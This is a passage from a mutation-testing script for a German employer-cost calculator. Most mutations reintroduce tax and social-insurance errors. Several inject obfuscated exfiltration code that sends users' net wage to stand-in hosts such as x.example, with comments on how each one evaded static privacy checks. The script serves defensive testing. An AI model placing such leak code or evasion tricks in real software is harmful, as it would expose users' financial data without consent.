// Mutation tests for the German employer-cost calculator — §44.
//
// WHAT THIS ANSWERS
// A passing suite proves the tests agree with the code. It does not prove they
// would DISAGREE with wrong code, and that is the property that matters: a
// calculator whose tests are written from the same misreading as its engine is
// exactly as wrong and considerably more confident.
//
// So each mutation below is a specific, plausible defect — every one of them
// either a mistake that was actually made during this build, or one the sources
// are shaped to invite. The script edits the real file on disk, runs the real
// suite, and requires it to FAIL. A mutation that survives is reported as a
// hole in the tests, not as a pass.
//
// The files are always restored, including on an unhandled error, and the
// script verifies byte-for-byte at the end that it left nothing behind.
//
// Run: node scripts/mutate-de-employer-cost.mjs   (npm run test:mutate-de-employer-cost)

import fs from 'node:fs'
import path from 'node:path'
import { execFileSync } from 'node:child_process'
import { fileURLToPath } from 'node:url'

const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), '..')
const abs = (rel) => path.join(ROOT, rel)
const read = (rel) => fs.readFileSync(abs(rel), 'utf8')

const PAP = 'lib/calculators/de-employer-cost/tax/pap-2026.ts'
const BRANCHES = 'lib/calculators/de-employer-cost/social/branches.ts'
const BVV = 'lib/calculators/de-employer-cost/social/bvv.ts'
const SCOPE = 'lib/calculators/de-employer-cost/scope.ts'
const ENGINE = 'lib/calculators/de-employer-cost/engine.ts'
const CHURCH = 'lib/calculators/de-employer-cost/tax/church-tax.ts'
const RULES = 'data/calculators/de-employer-cost/2026/rules.ts'
const VALIDATION = 'lib/calculators/de-employer-cost/validation.ts'
const COMPONENT = 'components/DeEmployerCostCalculator.tsx'
const BOUNDARY = 'components/DeEmployerCostCalculatorBoundary.tsx'
const UNSUPPORTED = 'lib/calculators/de-employer-cost/unsupported.ts'
const FORMATTING = 'lib/calculators/de-employer-cost/formatting.ts'
const PRIVACY = 'lib/calculators/de-employer-cost/privacy.test.ts'
const STYLES = 'styles.css'
const COPY = 'lib/calculators/de-employer-cost/copy.ts'
const CS_PAGE = 'lib/content/pages/germany-employer-cost-calculator.ts'

/** The anchor the two pixel mutations attach to. */
const LEDGER = '                <p className="ecc__exactness">{tr(RESULT.ledgerNote)}</p>'

const TOUCHED = [
  PAP, BRANCHES, BVV, SCOPE, ENGINE, CHURCH, RULES, VALIDATION, COMPONENT, BOUNDARY, UNSUPPORTED,
  FORMATTING, PRIVACY, STYLES, COPY, CS_PAGE,
]
const ORIGINAL = new Map(TOUCHED.map((f) => [f, read(f)]))

/**
 * Every mutation states the defect it re-introduces and where that defect comes
 * from, so a reader can judge whether it is worth guarding rather than taking
 * the count on trust.
 */
const MUTATIONS = [
  {
    name: '1. tariff zone 3 keyed on 17800 instead of 17799',
    why:
      'The subtrahend lives inside a graphic in the published PDF and is simply absent from extracted text. ' +
      'Anyone reconstructing it from the zone boundary gets 17800 — off by one euro, wrong for every salary in the zone.',
    file: PAP,
    from: "s.Y = X.subtract(d(17_799)).divideScaled(ZAHL10000, 6, DOWN);",
    to: "s.Y = X.subtract(d(17_800)).divideScaled(ZAHL10000, 6, DOWN);",
  },
  {
    name: '2. tariff zone 3 carrying the 2025 coefficient',
    why: 'The 2025 plan used 176,64 and 2026 uses 173,1. A year-on-year port that misses it looks entirely plausible.',
    file: PAP,
    from: "s.RW = B(s, 'Y').multiply(d(173.1));",
    to: "s.RW = B(s, 'Y').multiply(d(176.64));",
  },
  {
    name: '3. the Pflegeversicherung child discount applied to a childless employee',
    why:
      'In MPARA the discount is the ELSE of PVZ == 1, not an unconditional adjustment. Applying both is arithmetically ' +
      'tempting and legally impossible, and the flowchart draws it in a way that invites the mistake.',
    file: PAP,
    from:
      "  s.PVSATZAN =\n    I(s, 'PVZ') === 1\n      ? B(s, 'PVSATZAN').add(d(0.006))\n      : B(s, 'PVSATZAN').subtract(B(s, 'PVA').multiply(d(0.0025)));",
    to:
      "  if (I(s, 'PVZ') === 1) s.PVSATZAN = B(s, 'PVSATZAN').add(d(0.006));\n  s.PVSATZAN = B(s, 'PVSATZAN').subtract(B(s, 'PVA').multiply(d(0.0025)));",
  },
  {
    name: '4. the Steuerklasse V/VI 42 % ceiling dropped',
    why:
      'MST5_6 takes the SMALLER of the band construction and the flat 42 % extension. Reading the flowchart as a plain ' +
      'sequence produces the band alone, which exceeds the statutory "höchstens 42 %".',
    file: PAP,
    from: "      s.ST = B(s, 'HOCH').compareTo(B(s, 'VERGL')) === -1 ? B(s, 'HOCH') : B(s, 'VERGL');",
    to: "      s.ST = B(s, 'VERGL');",
  },
  {
    name: '5. the health ceiling set to the Jahresarbeitsentgeltgrenze',
    why:
      'The classic error in this jurisdiction. 69 750 is the contribution ceiling and 77 400 is the threshold above ' +
      'which an employee may leave the statutory scheme; both are "the health insurance limit" in ordinary speech.',
    file: RULES,
    from: "    monthlyCeilingCent: {\n      value: eur(5_812, 50),\n      sourceId: S.svRechgr,\n      // § 55 Absatz 2 SGB XI appears on the HEALTH ceiling",
    to: "    monthlyCeilingCent: {\n      value: eur(6_450),\n      sourceId: S.svRechgr,\n      // § 55 Absatz 2 SGB XI appears on the HEALTH ceiling",
  },
  {
    name: '6. contributions computed whole and halved, instead of halved and doubled',
    why:
      '§ 2 Absatz 1 Satz 1 BVV prescribes half the rate, rounded, then doubled. The obvious implementation is the other ' +
      'way round and differs by a cent on ordinary salaries.',
    file: BVV,
    from: "  const each = share(baseCent, halfStr);",
    to: "  const whole = share(baseCent, totalPercent);\n  const each = whole / 2n;",
  },
  {
    name: '7. the child discount taken off the employer’s care share as well',
    why:
      '§ 55 Absatz 3 Satz 4 SGB XI reads as though the discount lowers the whole Beitragssatz, and § 58 then splits it ' +
      'in halves. A literal reading hands the employer half of every discount.',
    file: BRANCHES,
    from: "    if (discounted > 0) {\n      employee = employee.subtract(",
    to:
      "    if (discounted > 0) {\n      employer = employer.subtract(\n        Decimal.of(R.care.perChildDiscountPercent.value).multiply(Decimal.of(discounted)),\n      );\n      employee = employee.subtract(",
  },
  {
    name: '8. Saxony adding a point instead of moving one',
    why:
      '§ 58 Absatz 3 SGB XI has the employee bear one point ALONE out of the same total. Adding it raises the Saxon ' +
      'total to 4,6 % and overstates every Saxon employer’s cost.',
    file: BRANCHES,
    from: "    const rest = total.subtract(saxonPoint).divideExact(two);\n    employer = rest;\n    employee = rest.add(saxonPoint);",
    to: "    employer = total.divideExact(two);\n    employee = employer.add(saxonPoint);",
  },
  {
    name: '9. the Übergangsbereich boundary made exclusive',
    why:
      '§ 20 Absatz 2 SGB IV says "2 000 Euro monatlich nicht übersteigt", so 2 000,00 is inside the band. A `<` here ' +
      'runs the ordinary calculation on a Midijob at exactly the boundary.',
    file: SCOPE,
    from: "  if (gross <= DE_RULES_2026.scope.transitionUpperMonthlyCent.value) {",
    to: "  if (gross < DE_RULES_2026.scope.transitionUpperMonthlyCent.value) {",
  },
  {
    name: '10. withheld amounts added to employer cost',
    why:
      'The single most common way an employer-cost calculator is wrong: counting the wage tax and the employee’s own ' +
      'contributions as a cost on top of the gross the employer is already paying.',
    file: ENGINE,
    from: "  const employerTotal = gross + employerContributions + employerLevies;",
    to: "  const employerTotal = gross + employerContributions + employerLevies + employeeSocial + lohnsteuerCent;",
  },
  {
    name: '11. church tax charged on the Lohnsteuer instead of the Kirchensteuer base',
    why:
      'BK and LSTLZZ are equal whenever there is no Kinderfreibetrag, which is most of the time — so the wrong one ' +
      'survives casual testing and is wrong exactly for families.',
    file: ENGINE,
    from: "  const kirchensteuer = churchTax(pap.outputs.BK.longValue(), {",
    to: "  const kirchensteuer = churchTax(lohnsteuerCent, {",
  },
  {
    name: '12. ALV folded back into KRV, as it was until 2025',
    why:
      'ALV is new for 2026 and splits the unemployment assumption out of KRV. A port that keeps one flag matches the ' +
      'general Prüftabelle — both are 0 there — and is wrong for anyone in one scheme but not the other.',
    file: PAP,
    from: "  if (I(s, 'ALV') !== 1 && I(s, 'STKL') !== 6) MVSPHB(s);",
    to: "  if (I(s, 'KRV') !== 1 && I(s, 'STKL') !== 6) MVSPHB(s);",
  },
  {
    name: '13. the Bavarian church-tax rate applied nationwide',
    why: 'Two rates exist and 9 % covers fourteen of sixteen states; defaulting everything to 8 % understates most of the country.',
    file: CHURCH,
    from: "    BE: '9', BB: '9', HB: '9', HH: '9', HE: '9', MV: '9', NI: '9', NW: '9',",
    to: "    BE: '8', BB: '8', HB: '8', HH: '8', HE: '8', MV: '8', NI: '8', NW: '8',",
  },
  {
    name: '14. the Zusatzbeitrag treated as employee-only, as before 2019',
    why:
      '§ 249 Absatz 1 SGB V has split it since 1 January 2019, and the older arrangement is still widely repeated. ' +
      'It moves about 1,45 % of gross off the employer at the average rate.',
    file: BRANCHES,
    from: "  const total = Decimal.of(general.value).add(Decimal.of(input.supplementPercent)).toString();\n  return line(",
    to:
      "  const total = general.value;\n  void input.supplementPercent;\n  return line(",
  },
  {
    name: '15. input validation bypassed',
    why:
      'Without it the engine answers questions it was not asked: a seventh Steuerklasse, a negative Kinderfreibetrag ' +
      'and a 900 % Zusatzbeitrag all returned a formatted net wage, the last of them negative.',
    file: ENGINE,
    from: "  const issues = validateDeInput(input);\n  if (issues.length > 0) return { supported: false, reason: 'invalid', issues };",
    to: "  const issues = validateDeInput(input);\n  void issues;",
  },
  {
    name: '16. the Steuerklasse range widened to accept a seventh class',
    why: 'There are six. The Programmablaufplan falls through its comparisons for anything else and computes something.',
    file: VALIDATION,
    from: "  if (!isInteger(input.steuerklasse) || input.steuerklasse < 1 || input.steuerklasse > 6) {",
    to: "  if (!isInteger(input.steuerklasse) || input.steuerklasse < 1 || input.steuerklasse > 9) {",
  },
  {
    name: '17. a negative gross reported as a Minijob',
    why:
      'Validation running after scope detection gives a true-but-wrong reason: every number below 603 EUR is a Minijob, ' +
      'and that is not why −100 EUR is not a wage.',
    file: ENGINE,
    from: "  const issues = validateDeInput(input);\n  if (issues.length > 0) return { supported: false, reason: 'invalid', issues };\n\n  const scope = checkScope({",
    to: "  const scope = checkScope({",
  },
  {
    name: '21. care discounts granted without proof of parenthood',
    why:
      '§ 55 Absatz 3a SGB XI makes the PROOF the entitlement. Writing the surcharge and the discounts as if/else lets a ' +
      'third state — unproved parenthood, under 23 — fall into the discount branch and receive four discounts on ' +
      'children the employer has no proof of.',
    file: BRANCHES,
    from: "  if (input.isParent) {\n    // Only children from the SECOND count",
    to: "  if (input.isParent || !input.atLeast23) {\n    // Only children from the SECOND count",
  },
  {
    name: '22. the declared-case guard checks only the first element',
    why:
      'Returning inside the first iteration meant element 0 was the only one validated, so the same set of ' +
      'declarations either threw or silently accepted a detected id depending on the order it was passed in.',
    file: SCOPE,
    from: "  const declared = input.declared ?? [];\n  for (const id of declared) {",
    to: "  const declared = (input.declared ?? []).slice(0, 1);\n  for (const id of declared) {",
  },
  {
    name: '23. the Steuerklasse VI second-employment warning removed',
    why:
      'Class VI ordinarily means a second job, and the ceilings work across employments — the case the registry ' +
      'refuses as mehrfachbeschaeftigung. Without the warning the engine answers confidently for an employee whose ' +
      'contributions it is likely overstating.',
    file: ENGINE,
    from: "  if (input.steuerklasse === 6) {",
    to: "  if (false && input.steuerklasse === 6) {",
  },
  {
    name: '24. the unproved-parenthood warning removed',
    why:
      'Steuerklasse II and a Kinderfreibetrag both presuppose a child. The engine correctly honours the proof flag, ' +
      'but without the warning a contradictory ELStAM entry produces a confident number and no hint.',
    file: ENGINE,
    from: "    notes.push({ key: 'care.proofMissing', severity: 'warning', text: 'de.note.parenthoodUnproved' });",
    to: '',
  },
  {
    name: '27. a DOM-mutation leak: style.setProperty with every fragment split',
    why:
      'The leak that defeated the textual rules. No JSX attribute, no document./window., and no literal containing ' +
      'http, //, url( or background-image — every part assembled at run time. Only a rule that forbids touching a ' +
      'node at all can catch it, which is why the DOM sinks are structural rather than textual.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { set('gross')(e.target.value); const n = e.currentTarget; " +
      "const v = outcome && outcome.supported !== false ? outcome.employee.netCent.toString(36) : ''; " +
      "if (v) n.style.setProperty('back' + 'ground-' + 'image', 'ur' + 'l(' + 'ht' + 'tps' + ':' + '/' + '/' + 'x' + '.example/p/' + v + ')') }}",
  },
  {
    name: '28. the empty-state message shown while another field is at fault',
    why:
      'RESULT.empty speaks only about the gross. Rendering it for ANY unreadable field told a reader with a valid ' +
      'gross to enter a gross, naming the one field that was correct.',
    file: COMPONENT,
    from: "            {problems.length > 0 ? (",
    to: "            {false ? (",
  },
  {
    name: '29. a wrong statutory citation restored',
    why:
      '§ 8 Absatz 3 SGB IV is about self-employment and says nothing about apprentices. A wrong citation is worse ' +
      'than none: it looks checkable, and the reader who follows it cannot tell whether the calculator or the ' +
      'citation is confused.',
    file: UNSUPPORTED,
    from: "§ 7 Absatz 1 Satz 1 Nummer 1 SGB V und die entsprechenden Vorschriften der übrigen Zweige",
    to: "§ 8 Absatz 3 Satz 1 SGB IV",
  },

  // ── Privacy. Each of these three was written during review as an ATTEMPT to
  // defeat the gate, and the first two succeeded before it was strengthened.
  {
    name: '18. a tracking pixel carrying net, gross and church tax',
    why:
      'The defect that got past 315 assertions on the Czech calculator: an attribute that makes the browser issue the ' +
      'request for you, which no list of transmission APIs covers.',
    file: COMPONENT,
    from: LEDGER,
    to:
      LEDGER +
      "\n                <img alt=\"\" src={'https://analytics.example.com/px?net=' + String(outcome.employee.netCent)} />",
  },
  {
    name: '19. the same leak with the host assembled from fragments and a camelCase sink',
    why:
      'SURVIVED the original gate. No absolute URL literal exists anywhere, and `backgroundImage` does not match a ' +
      '`background-image` pattern. The runtime wire test caught THIS instance, because it sends the net wage as ' +
      'decimal digits and the watcher greps for the figures on screen. It would NOT catch the class: ' +
      '`netCent.toString(36)` encodes the same value past a watcher that matches rendered values, and nothing ' +
      'forbids encoding before a sink. The rule that closes the family is the DOM-mutation rule, not either watcher.',
    file: COMPONENT,
    from: LEDGER,
    to:
      LEDGER +
      "\n                <div style={{ backgroundImage: 'url(' + ['htt','ps:','//','x.example','.com'].join('') + '/p?n=' + String(outcome.employee.netCent) + ')' }} />",
  },
  {
    name: '20. the net wage in a prefetched internal path segment',
    why:
      'SURVIVED the original gate. No query string, no fragment, no external origin — and Next.js prefetches it, ' +
      'putting the reader’s net wage in our own access log on a page that promises the calculation never leaves the browser.',
    file: BOUNDARY,
    from: "          <Link href={CROSS_LINK_PATH[locale]}>{tr(CROSS_LINK.label)}</Link>",
    to:
      "          <Link href={CROSS_LINK_PATH[locale]}>{tr(CROSS_LINK.label)}</Link>\n" +
      "          <Link href={'/r/' + String(DISPLAY_CENT.minijobMonthly)}>x</Link>",
  },
  {
    name: '25. a BigInt literal in the bootstrap that guards BigInt',
    why:
      'The boundary and everything it imports outside the dynamic edge must PARSE on browsers without BigInt — a ' +
      'single literal there makes the guard unparseable on exactly the browsers it protects, and the page fails ' +
      'silently again.',
    file: BOUNDARY,
    from: "const LANG: Record<DeLocale, string> = { de: 'de', en: 'en', cs: 'cs' }",
    to: "const LANG: Record<DeLocale, string> = { de: 'de', en: 'en', cs: 'cs' }\nconst SCALE = BigInt(100) * 10n",
  },
  {
    name: '26. the dynamic import specifier made interpolable',
    why:
      'A literal specifier is what keeps the dynamic import a same-origin webpack chunk load. An interpolated one ' +
      'could name any URL webpack is willing to fetch, and it is the one import() the privacy gate permits.',
    file: BOUNDARY,
    from: "const Calculator = dynamic(() => import('./DeEmployerCostCalculator'), {",
    to: "const Calculator = dynamic(() => import(`./${'DeEmployerCostCalculator'}`), {",
  },
  // ── Round five. Six independent bypasses of the privacy gate, a thousandfold
  // money misread, and four sentences that were false in one language only.
  {
    name: '30. the comment stripper that swallowed a live fetch',
    why:
      'A regex character class containing a slash and a star opened a block comment as far as the hand-written ' +
      'walker was concerned, and it blanked everything to the next terminator. A reviewer put an unobfuscated ' +
      'fetch in the gap and all 729 assertions passed, because none of them saw the line.',
    file: PRIVACY,
    from: '    const kids = n.getChildren(sf);',
    to: '    if (src.indexOf("/*") !== -1) { blank(src.indexOf("/*"), src.indexOf("*/", src.indexOf("/*") + 2) + 2) }\n    const kids = n.getChildren(sf);',
  },
  {
    name: '31. the same DOM leak with the node held in a local and the keys bracketed',
    why:
      'The answer to mutation 27 was a list of property names, which is textual: n[\'sty\' + \'le\'] walks past it. ' +
      'The structural gate is what has to catch this — style and setProperty are properties the closure never ' +
      'declares, and the bracket access is a computed site that is not pinned.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { const n = e.target; n['sty' + 'le']['setPro' + 'perty']('back' + 'ground-' + 'image', " +
      "'ur' + 'l(' + '/' + 'r/' + n.value + ')'); set('gross')(n.value) }}",
  },
  {
    name: '32. ambient state through ownerDocument, which issues no request at all',
    why:
      'e.target.ownerDocument.title defeats every browser-global rule — ownerDocument contains no lowercase ' +
      '"document", defaultView names no window — and the runtime wire watcher cannot see it, because writing a ' +
      'title makes no request. The site chrome then sends the title with the next page_view.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { e.target.ownerDocument.title = e.target.value + ':' + steuerklasse; " +
      "set('gross')(e.target.value) }}",
  },
  {
    name: '33. the stylesheet half of the CSS conspiracy, on a class the gate used to skip',
    why:
      'The stylesheet was filtered to chunks containing ".ecc"; the calculator\'s form is .pcalc__grid, so 88 rules ' +
      'that style it were never inspected. An attribute selector paired with a background-image exfiltrates a ' +
      'figure digit by digit, and neither file looks wrong on its own.',
    file: STYLES,
    from: '.ecc--de .ecc__table-wrap { max-width: 100%; }',
    to:
      '.ecc--de .ecc__table-wrap { max-width: 100%; }\n' +
      '.pcalc__grid [data-net^="1"] { background-image: url(https://x.example/1); }',
  },
  {
    name: '34. the parser reading a three-decimal amount as thousands again',
    why:
      'On the German page "12,500" meant twelve euro fifty with a stray zero and was read as twelve thousand five ' +
      'hundred. Typed into the accident-insurance field on a 3 000 EUR gross it moved employer cost from 3 651,50 ' +
      'to 16 139,00 with no error, no warning and no refusal.',
    file: FORMATTING,
    from: '      if (isDecimalSeparatorHere) return null;',
    to: '      if (false) return null;',
  },
  {
    name: '35. engine-validation issues rendered without naming their field',
    why:
      'The parse half of this list names its field and the engine half did not, so "Please enter a monthly amount ' +
      'below 100 million euro." appeared alone with four monthly amounts on screen — one branch away from the ' +
      'defect the parse-side fix was written to answer.',
    file: COMPONENT,
    from: "                    <strong>{tr(p.field)}:</strong> {tr(p.text)}",
    to: "                    {tr(p.text)}",
  },
  {
    name: '36. the Kurzarbeit refusal telling a Czech reader the labour agency pays part',
    why:
      'Under § 249 Absatz 2 SGB V the employer bears the contribution on the fictitious pay ALONE. The German and ' +
      'English texts of the same case name no bearer, so only the Czech reader was told this — on a calculator ' +
      'whose whole subject is who bears which cost.',
    file: UNSUPPORTED,
    from: "'Kurzarbeitergeld a rozdělení odvodů během výpadku práce se řídí vlastními pravidly. Běžný výpočet zde neplatí.'",
    to: "'Při kurzarbeitu se odvody počítají z fiktivního vyměřovacího základu a část hradí Spolková agentura práce. Běžný výpočet zde neplatí.'",
  },
  {
    name: '37. the Minijob refusal describing a boundary it does not fire at',
    why:
      'The refusal is inclusive at 603,00 EUR, and § 8 Absatz 1 Nummer 1 SGB IV covers pay that does not EXCEED ' +
      'the limit. "Unterhalb" contradicted both the code and the ceilings list on the same screen.',
    file: UNSUPPORTED,
    from: "'Bis einschließlich zur Geringfügigkeitsgrenze gelten pauschale",
    to: "'Unterhalb der Geringfügigkeitsgrenze gelten pauschale",
  },
  {
    name: '38. the U2 warning claiming the levy binds every employer without exception',
    why:
      '§ 11 AAG disapplies § 1 entirely to farming family members and NATO-stationed forces. The distinguishing ' +
      'fact about U2 is that it does not stop at 30 employees the way U1 does, which is a different claim.',
    file: COPY,
    from: 'Die Umlage U2 gilt nach § 1 Absatz 2 AAG unabhängig von der Beschäftigtenzahl — anders als U1 — vorbehaltlich der Ausnahmen des § 11 AAG;',
    to: 'Die Umlage U2 ist nach § 1 Absatz 2 AAG für jeden Arbeitgeber verpflichtend;',
  },
  {
    name: '39. a declared refusal dropped from the page that lists the refusals',
    why:
      'The methodology enumerated ten cases while the registry declared fifteen. A reader consulting it to learn ' +
      'whether an apprentice can be calculated was told, by omission, that one can.',
    file: CS_PAGE,
    from: 'krátkodobé zaměstnání, učně, dobrovolnickou službu, ',
    to: '',
  },
  // ── Round six. The privacy gate's own model was the target this time, and
  // three of these passed 1 204 assertions on the previous candidate.
  {
    name: '40. a bracketed style write, which CSSOM forwards to cssText',
    why:
      'The property pin was `used minus declared`, and `declared` was a closure-wide bag fed by every ' +
      'object-literal key in nineteen files — so `style: \'currency\'`, an option handed to Intl.NumberFormat, ' +
      'authorized `x[\'style\']`. The assignment sets the whole inline style and issues a real request.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { e.target['style'] = 'back' + 'ground:u' + 'rl(' + '/' + '/x.example/' + " +
      "e.target.value + ')'; set('gross')(e.target.value) }}",
  },
  {
    name: '41. a capability lifted out by destructuring',
    why:
      'A destructuring pattern used to add the property name to the DECLARED side and nothing to the used ' +
      'side, so `const { fetch: send } = self` extracted a capability without any checked name appearing. ' +
      'Destructuring is a property read, and is counted as one.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { const { style: css } = e.target; css.backgroundImage = 'ur' + 'l(/r/' + " +
      "e.target.value + ')'; set('gross')(e.target.value) }}",
  },
  {
    name: '42. a global recovered by shadowing its name somewhere else in the file',
    why:
      'Scope resolution was flat per file: one unused `.map((k, document) => …)` parameter made `document` ' +
      'local for the whole file, and a plain `document[\'title\']` write three hundred lines away never ' +
      'entered the free set. Real scoping catches it AND breaks it, because a name that shadows the global ' +
      'no longer holds the global.',
    file: COMPONENT,
    from: "{STEUERKLASSEN.map((k) => (",
    to:
      "{STEUERKLASSEN.map((k, document) => (\n                        <option key={k} value={k}>{document}</option>\n                      )).slice(0, 0).concat(STEUERKLASSEN.map((k) => (",
  },
  {
    name: '43. a JSX style prop, previously visible only to the textual rules',
    why:
      'JSX attribute names are property writes on a node. Counting them keeps `style={{ backgroundImage }}` ' +
      'and `data-net={net}` inside the structural proof instead of leaving that family to a substring match.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to: "onChange={(e) => set('gross')(e.target.value)} style={{ backgroundImage: 'ur' + 'l(/r/' + gross + ')' }}",
  },
  {
    name: '44. the two error layers made mutually exclusive again',
    why:
      'One unreadable field nulled the outcome, so validateDeInput never ran on the fields that DID parse: ' +
      'with a bad accident amount, a 99 % Zusatzbeitrag and 25 children entered at once, the reader saw one ' +
      'message and the other two appeared nowhere on the page.',
    file: COMPONENT,
    from: "        ? validateDeInput(candidate)",
    to: "        ? []",
  },
  {
    name: '45. the messages detached from the controls they are about',
    why:
      'Not one input carried aria-invalid or aria-describedby, so a screen-reader user sitting on the ' +
      'offending control was told nothing: the messages lived in a separate region with no programmatic ' +
      'relationship to the field at fault.',
    file: COMPONENT,
    from: "                    aria-describedby={errorId('gross')}\n",
    to: '',
  },
  {
    name: '46. the wrong statutory rate behind the Vorsorgepauschale constant',
    why:
      '0,07 is half of the ERMÄSSIGTER Beitragssatz of 14,0 % (§ 243 SGB V). The allgemeiner Beitragssatz is ' +
      '14,6 % (§ 241 SGB V) and its half is 0,073. Anlage 1 of this very PAP names § 243 expressly, and ' +
      'rules.ts warns that confusing the two understates every employee\'s health contribution by 0,3 points.',
    file: PAP,
    from: "The 0,07 is half of the ERMÄSSIGTER Beitragssatz of 14,0 %",
    to: "The 0,07 is the employee's half of the 14 % allgemeiner Beitragssatz, per",
  },
  {
    name: '47. the Baugewerbe refusal calling a federal ordinance a collective agreement',
    why:
      '§ 3 WinterbeschV fixes the Winterbeschäftigungs-Umlage rates nationally by Rechtsverordnung. Saying ' +
      'both levies are "tarifvertraglich geregelt … nicht gesetzlich einheitlich" was false of one of them, ' +
      'in German and English only — the Czech text made no such claim.',
    file: UNSUPPORTED,
    from: "Die Sozialkassenbeiträge folgen dagegen den Tarifverträgen und unterscheiden sich je nach Branche.",
    to: "Beide sind tarifvertraglich geregelt und branchenabhängig, nicht gesetzlich einheitlich.",
  },
  // ── Round seven. Two more structural bypasses of the privacy gate, and two
  // more statements about German law that were wrong in the code.
  {
    name: '48. a capability walked off an event object by destructuring ASSIGNMENT',
    why:
      'Fixing `const { fetch: send } = self` last round covered the PATTERN form only. Dropping the ' +
      'declaration — `({ ownerDocument: a } = e.target)` — parses as an object literal on the left of an ' +
      'assignment, with no BindingElement anywhere, so the fix did not apply and three plain lines lifted a ' +
      'live fetch off an event object.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { let a, b, c; ({ ownerDocument: a } = e.target); ({ defaultView: b } = a); " +
      "({ fetch: c } = b); c.call(b, '/x?g=' + e.target.value); set('gross')(e.target.value) }}",
  },
  {
    name: '49. a global disarmed by a parameter that exists only in a type annotation',
    why:
      'A name bound only in a TYPE has no runtime existence — the annotation is erased — but it was being ' +
      'bound into the nearest RUNTIME scope, which for a module-level annotation is the whole file. One ' +
      'innocuous line then disarmed the free-identifier pin for any global.',
    file: COMPONENT,
    from: "const STEUERKLASSEN",
    to:
      "const noop: (self: unknown) => void = () => {}\nconst leak = (v: string) => self.fetch('/x?g=' + v)\n" +
      "const STEUERKLASSEN",
  },
  {
    name: '50. the Saxon note describing the statute backwards',
    why:
      '§ 58 Absatz 3 Satz 1 SGB XI says the EMPLOYEE bears one percentage point ALONE and Satz 3 halves the ' +
      'rest. The wording about an employer share computed from a rate reduced by one point is in Absatz 5, ' +
      'which reaches only the Übergangsbereich and § 7 Absatz 2 SGB V cases — both refused here.',
    file: RULES,
    from: "THE STATUTE, § 58 Absatz 3 Satz 1 SGB XI, verbatim:",
    to: "the mechanism is the statute\'s own: § 58 Absatz 3 SGB XI computes the EMPLOYER share from a rate reduced by one percentage point, and the employee bears the remainder. Ignore:",
  },
  {
    name: '51. the Baugewerbe refusal citing the rate that 2026 displaced',
    why:
      '§ 3a WinterbeschV cuts the building-trade levy to 1 % (0,6/0,4) for the whole of 2026, which is this ' +
      "calculator's only year. A reader who followed the old citation to § 3 would have doubled the cost the " +
      'refusal says it is omitting.',
    file: UNSUPPORTED,
    from: "Für 2026 senkt § 3a WinterbeschV den Umlagesatz im Baugewerbe befristet auf 1 % — davon 0,6 % Arbeitgeber, 0,4 % Arbeitnehmer — statt der 2 % aus § 3 Absatz 1 Nummer 1 mit der Aufteilung 1,2/0,8 nach § 3 Absatz 2 Nummer 1;",
    to: "Die Umlagesätze stehen in § 3 WinterbeschV und gelten bundesweit;",
  },
  {
    name: '52. the U1 message naming the checkbox instead of the rate input',
    why:
      'The form has two U1 controls with two accessible names. The rate parse error was prefixed with the ' +
      "participation checkbox's name and wired by aria-describedby to the rate input, so the reader was told " +
      'to fix one control while the browser pointed at another.',
    file: COPY,
    from: "  'u1.unreadable': FIELD.u1Rate,",
    to: "  'u1.unreadable': FIELD.u1,",
  },
  {
    name: '53. a capability extracted through a COMPUTED destructuring key',
    why:
      'A ComputedPropertyName in a binding pattern recorded nothing: no property, because it has no text, ' +
      'and no computed access, because the node is a BindingElement rather than an ElementAccessExpression. ' +
      'Three chained lines walked a live capability off an event object with every pinned set empty.',
    file: COMPONENT,
    from: "onChange={(e) => set('gross')(e.target.value)}",
    to:
      "onChange={(e) => { const { ['owner' + 'Document']: d } = e.target; " +
      "const { ['default' + 'View']: w } = d; const { ['fe' + 'tch']: f } = w; " +
      "f.call(w, '/x?g=' + e.target.value); set('gross')(e.target.value) }}",
  },
  // ── Round eight. Two ways of acquiring a capability without naming it in the
  // gate's file at all, and three statements about German law.
  {
    name: '54. a navigation capability imported from a bare module',
    why:
      'Both closure walkers skip specifiers that do not start with a dot, and an imported name is bound in ' +
      'scope so it is never free — so an imported capability had ZERO structural footprint. useRouter plus ' +
      "router.replace('#g' + gross) put the salary, the Steuerklasse and the Article-9 church flag into the " +
      'URL, which the analytics bundle reports as page_view.url.',
    file: COMPONENT,
    from: "import { DE_RULES_2026 }",
    to: "import { useRouter } from 'next/router'\nimport { DE_RULES_2026 }",
  },
  {
    name: '55. a global disarmed by an ambient declaration',
    why:
      '`declare const location` disappears at emit, so `location` still means the global — but binding it ' +
      'into the runtime scope model removed it from the free set for the whole file. Type positions were ' +
      'closed two rounds ago; ambient declarations are the same class one door further out.',
    file: COMPONENT,
    from: "const STEUERKLASSEN",
    to: "declare const location: { replace: (u: string) => void }\nconst leak2 = (v) => location.replace('#g' + v)\nconst STEUERKLASSEN",
  },
  {
    name: '56. the GKV Act described as taking effect entirely from 2027',
    why:
      'Artikel 8 puts the Act in force generally on 30 July 2026, and a separate block starts on 1 January ' +
      '2028. The narrow claim that matters here — nothing in it changes a 2026 CONTRIBUTION — is true; the ' +
      'sentence around it was false in both directions, on all three public routes.',
    file: CS_PAGE,
    from: "ustanovení, která by ovlivnila odvody, však míří až na rok 2027",
    to: "všechna jeho ustanovení však míří až na rok 2027",
  },
  {
    name: '57. the parenthood warning fired where the surcharge does not apply',
    why:
      'The note says the childless surcharge is being charged. Firing it for someone who has not passed the ' +
      'month of their 23rd birthday made it contradict the care line printed beside it — § 55 Absatz 3 ' +
      'Satz 1 SGB XI charges the Zuschlag only after that month, and the engine correctly did not.',
    file: ENGINE,
    from: "    !input.care.isParent &&\n    input.care.atLeast23 &&",
    to: "    !input.care.isParent &&",
  },
  {
    name: '58. the English label naming the wrong entitlement',
    why:
      '§ 243 SGB V turns on Krankengeld, the health fund\'s benefit from week seven. "Sick-pay entitlement" ' +
      'names Entgeltfortzahlung — and the same rendered form already uses those two words one fieldset ' +
